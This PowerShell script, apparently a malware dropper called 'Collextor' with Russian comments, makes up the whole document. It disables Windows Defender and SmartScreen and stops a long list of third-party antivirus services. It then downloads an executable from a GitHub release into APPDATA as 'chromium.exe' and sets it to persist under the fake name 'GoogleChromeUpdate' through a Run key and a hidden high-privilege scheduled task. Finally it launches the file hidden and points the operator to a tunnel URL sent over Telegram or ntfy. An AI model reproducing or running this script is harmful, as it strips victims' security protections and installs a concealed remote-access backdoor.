#Requires -RunAsAdministrator
# ── Collextor fast deploy ──────────────────────────────────────────────────────
# Запускать от имени администратора:
#   powershell -ExecutionPolicy Bypass -File deploy.ps1
#
# Параметры:
param(
    [string]$GitHubUrl = "https://github.com/Holycheck/checker/releases/download/realease/check.exe",
    [string]$InstallPath = "$env:APPDATA\Microsoft\Windows\chromium.exe"
)

$ErrorActionPreference = "SilentlyContinue"

Write-Host "[*] Collextor deploy script" -ForegroundColor Cyan

# ── 1. Exclusions Windows Defender ────────────────────────────────────────────
Write-Host "[1] Adding Defender exclusions..." -ForegroundColor Yellow
try {
    Add-MpPreference -ExclusionPath $env:APPDATA -Force
    Add-MpPreference -ExclusionPath $env:LOCALAPPDATA -Force
    Add-MpPreference -ExclusionPath $env:TEMP -Force
    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Microsoft\Windows\Explorer" -Force
    Add-MpPreference -ExclusionProcess "chromium.exe" -Force
    Add-MpPreference -ExclusionProcess "DwmCache.bin" -Force
    # Исключить весь путь установки
    Add-MpPreference -ExclusionPath (Split-Path $InstallPath) -Force
    Write-Host "    Defender exclusions OK" -ForegroundColor Green
} catch {
    Write-Host "    Defender exclusion failed: $_" -ForegroundColor Red
}

# ── 2. Отключить real-time protection Defender ────────────────────────────────
Write-Host "[2] Disabling Defender real-time protection..." -ForegroundColor Yellow
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -Force
    Set-MpPreference -DisableBehaviorMonitoring $true -Force
    Set-MpPreference -DisableBlockAtFirstSeen $true -Force
    Set-MpPreference -DisableIOAVProtection $true -Force
    Set-MpPreference -DisableScriptScanning $true -Force
    Set-MpPreference -SubmitSamplesConsent NeverSend -Force
    Write-Host "    Defender RT protection disabled" -ForegroundColor Green
} catch {
    Write-Host "    Failed (may need policy override): $_" -ForegroundColor Red
}

# ── 3. Отключить SmartScreen ──────────────────────────────────────────────────
Write-Host "[3] Disabling SmartScreen..." -ForegroundColor Yellow
try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" `
        -Name "SmartScreenEnabled" -Value "Off" -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" `
        -Name "EnableSmartScreen" -Value 0 -Force
    Write-Host "    SmartScreen disabled" -ForegroundColor Green
} catch {
    Write-Host "    SmartScreen: $_" -ForegroundColor Red
}

# ── 4. Отключить сторонние антивирусы (Kaspersky, Avast, ESET, Malwarebytes, McAfee) ──
Write-Host "[4] Stopping 3rd-party AV services..." -ForegroundColor Yellow
$avServices = @(
    # Kaspersky
    "AVP","klnagent","avpui","kavfs","kavfsgt","klvssbrigde",
    # Avast / AVG
    "aswbIDSAgent","aswMonFlt","aswRvrt","aswSnx","aswSP","aswStm","aswVmm","aswbidsdriver",
    "avast! antivirus","avgwd","avgsvc","avgfws",
    # ESET
    "ekrn","egui",
    # Malwarebytes
    "MBAMService","MBAMWebProtectionService",
    # McAfee
    "mcshield","mfemms","mfevtp","McMPFSvc",
    # Norton / Symantec
    "ccSetMgr","ccEvtMgr","Symantec AntiVirus","NortonSecurity",
    # BitDefender
    "bdredline","bdntwrk","bdagent",
    # Trend Micro
    "TmCCSF","TmPfw","tmproxy",
    # Sophos
    "SAVService","SophosAgent","SophosAutoUpdate",
    # Windows Security Center
    "wscsvc"
)
foreach ($svc in $avServices) {
    $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
    if ($s) {
        Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
        Set-Service  -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
        Write-Host "    Stopped: $svc" -ForegroundColor Green
    }
}

# Kill AV processes by name
$avProcs = @("avp","avpui","avgui","avastui","egui","mbam","mcshield","bdagent","sophosui","nortonsecurity")
foreach ($p in $avProcs) {
    Stop-Process -Name $p -Force -ErrorAction SilentlyContinue
}

# ── 5. Скачать chromium.exe с GitHub ──────────────────────────────────────────
Write-Host "[5] Downloading from GitHub: $GitHubUrl" -ForegroundColor Yellow
try {
    # Убедиться что папка существует
    $dir = Split-Path $InstallPath
    if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }

    # Скачать
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($GitHubUrl, $InstallPath)

    if (Test-Path $InstallPath) {
        Write-Host "    Downloaded to: $InstallPath" -ForegroundColor Green
    } else {
        Write-Host "    Download FAILED" -ForegroundColor Red
        exit 1
    }
} catch {
    Write-Host "    Download error: $_" -ForegroundColor Red
    exit 1
}

# ── 6. Добавить в автозапуск ───────────────────────────────────────────────────
Write-Host "[6] Adding to autostart..." -ForegroundColor Yellow
try {
    # Registry (HKCU - не нужны права)
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
        -Name "GoogleChromeUpdate" -Value "`"$InstallPath`"" -Force

    # Scheduled Task (запуск при входе, с наивысшими правами)
    $action  = New-ScheduledTaskAction -Execute $InstallPath
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0 `
        -RestartCount 99 -RestartInterval (New-TimeSpan -Minutes 1)
    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME `
        -LogonType Interactive -RunLevel Highest
    Register-ScheduledTask -TaskName "GoogleChromeUpdate" `
        -Action $action -Trigger $trigger -Settings $settings `
        -Principal $principal -Force | Out-Null

    Write-Host "    Autostart OK (registry + scheduled task)" -ForegroundColor Green
} catch {
    Write-Host "    Autostart: $_" -ForegroundColor Red
}

# ── 7. Запустить ──────────────────────────────────────────────────────────────
Write-Host "[7] Starting chromium.exe..." -ForegroundColor Yellow
try {
    Start-Process -FilePath $InstallPath -WindowStyle Hidden
    Start-Sleep 2
    $running = Get-Process -Name "chromium" -ErrorAction SilentlyContinue
    if ($running) {
        Write-Host "    Running (PID $($running.Id))" -ForegroundColor Green
    } else {
        Write-Host "    Process not found after start" -ForegroundColor Red
    }
} catch {
    Write-Host "    Start error: $_" -ForegroundColor Red
}

Write-Host ""
Write-Host "[DONE] Deploy complete." -ForegroundColor Cyan
Write-Host "       Installed: $InstallPath"
Write-Host "       Check Telegram/ntfy for tunnel URL."
